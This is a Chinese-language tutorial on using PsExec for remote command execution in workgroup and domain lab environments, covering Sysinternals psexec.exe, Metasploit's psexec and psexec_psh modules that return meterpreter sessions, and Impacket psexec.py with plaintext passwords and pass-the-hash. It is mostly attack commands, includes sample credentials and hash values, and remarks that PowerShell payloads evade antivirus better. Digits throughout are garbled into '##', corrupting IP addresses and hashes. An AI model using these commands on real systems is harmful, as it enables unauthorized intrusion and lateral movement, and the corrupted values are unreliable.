# psexec工具的使用

目录

    psexec使用前提

    工作组环境

    域环境

           登录域控  

           以域用户登录域成员主机

           以本地用户登录域成员主机

    MSF中的psexec模块

    Impacket中的psexec.py

*

    psexec 是 windows 下非常好的一款远程命令行工具。psexec的使用不需要对方主机开机3389端口，只需要对方开启admin$共享或 c$ (该共享默认开启，依赖于445端口)。但是，假如目标主机开启了防火墙(因为防火墙默认禁止445端口的连接)，psexec也是不能使用的，会提示找不到网络路径。由于psexec是windows提供的工具，所以杀毒软件会将其添加到白名单中。

psexec.exe依赖于admin$共享，而impacket下的psexec.py则依赖于admin$或c$共享。

psexec的基本原理是：通过管道在远程目标机器上创建一个psexec服务，并在本地磁盘中生成一个名为"PSEXESVC"的二进制文件。然后，通过psexec服务运行命令，运行结束后删除服务。

在使用psexec执行远程命令时，会在目标系统中创建一个psexec服务。命令执行后，psexec服务将会被自动删除。由于创建或删除服务时会产生大量的日志，所以会在攻击溯源时通过日志反推攻击流程。  

![图片](_v_images/2## 21## 628## 91## 51## 55_1686)

## 1

psexec使用前提


- 对方主机开启了 admin$ 共享，如果关闭了admin$共享，会提示：找不到网络名
    
- 如果是工作组环境，则必须使用administrator用户连接，使用普通用户连接会提示：登录失败: 未授予用户在此计算机上的请求登录类型。
    
- 如果是域环境，连接普通域主机可以用普通域用户，连接域控需要域管理员。
![图片](_v_images/2## 21## 628## 91## 5## 947_27745)


![图片](_v_images/2## 21## 628## 91## 5## 842_5668)



参数：

- -u：指定用户名
    
- -p：指定密码
    
- -accepteula：第一次运行psexec会弹出确认框，使用该参数就不会弹出确认框
    
- -s：以system权限运行运程进程，获得一个system权限的交互式shell。如果不使用该参数，会获得一个administrator权限的shell
    

  

## 2

工作组环境

  

  

  

如果是在非域环境下即工作组环境，psexec只能使用 administrator 账号登录，使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。

目标机器：192.168.1## .131

- 管理员：administrator 密码：root
    
- 管理员：test 密码：root
    
- 非管理员：hack 密码：root
    

```
psexec.exe \\192.168.1## .131 -u administrator -p root cmd
```

由图可知，只有 administrator 用户可使用psexec登陆。即使 test 用户也在管理，也不能登录。

  

![图片](_v_images/2## 21## 628## 91## 5## 736_22682)

  

## 3

域环境

  

  

登录域控

  

域控只能使用域管理员组内账号密码登录，不能使用域普通成员账号登录，也不能本地登录。

- 域控：192.168.1## .131
    
- 域管理员：xie\\test 密码：x123456./
    

```
psexec.exe \\192.168.1## .131 -u xie\test -p x123456./ cmd
```

![图片](_v_images/2## 21## 628## 91## 5## 631_4## 35)

  

以域用户登录域成员主机

  

- 域成员主机：192.168.1## .13## 
    
- 域普通用户：xie\\hack 密码：x123456./
    

  

域成员主机可以使用普通域用户登录

```
psexec.exe \\192.168.1## .13##  -u xie\hack -p x123456./ cmd
```

![图片](_v_images/2## 21## 628## 91## 5## 526_22151)  

以本地用户登录域成员主机

- 域成员主机：192.168.1## .22 (pc-win2## ## 8)

- 本地管理员：administrator 密码：root

使用本地用户登录域成员主机，也只能使用本地的 administrator 用户登录，前提是该主机没禁用administrator用户。

![图片](_v_images/2## 21## 628## 91## 5## 3## 7_21532)

## 4

MSF中的psexec模块

  

END  

  

MSF中的psexec，主要讲以下两个：

- exploit/windows/smb/psexec：该模块生成的payload是exe程序
    
- exploit/windows/smb/psexec_psh ：该模块生成的payload主要是由powershell实现的
    

  

显然powershell生成的payload免杀效果比exe的要好，但是windows xp、server2## ## 3默认不包含powershell环境。所以，这两个模块各有各自的优势。

  

![图片](_v_images/2## 21## 628## 91## 5## ## 93_8268)

use exploit/windows/smb/psexec

set rhost 192.168.1## .131

set smbuser administrator

set smbpass x123456./@

exploit

  

攻击成功后，会返回一个meterpreter类型的session 

  

![图片](_v_images/2## 21## 628## 91## 49988_331## )

  

## 5

Impacket中的psexec.py

  

  

  

关于如何安装Impacket框架

  

git clone https://github.com/CoreSecurity/impacket.git

cd impacket/

python setup.py install

cd examples

./psexec.py xxx

  

这里由于我是在自己的VPS上安装的Impacket框架，而靶机处在内网，所以我用代理实现互通。

  

#用明文密码连接

./psexec.py xie/administrator:密码@192.168.1## .131

#用哈希值连接

./psexec.py xie/administrator@192.168.1## .131 -hashes AADA8EDA23213C## 25AE5## F5CD5697D9F:6542D35ED5FF6AE5E75B875## 68C5D3BC

  

![图片](_v_images/2## 21## 628## 91## 49883_22## 6## )

  

![图片](_v_images/2## 21## 628## 91## 49777_9328)

  

如果对方主机未开启445端口，则报如下错：

  

\[-\] \[Errno Connection error (xx.xx.xx.xx:445)\] \[WinError 1## ## 6## \] 由于连接方在一段时间后没有正确答复或连接的主机没有反应，连接尝试失败。

![图片](_v_images/2## 21## 628## 91## 49655_14855)

如果对方主机开启了445端口，但是没有开启admin$和c$共享，则报如下错：

\[*\] Requesting shares on xx.xx.xx.xx.....

![图片](_v_images/2## 21## 628## 91## 49511_27623)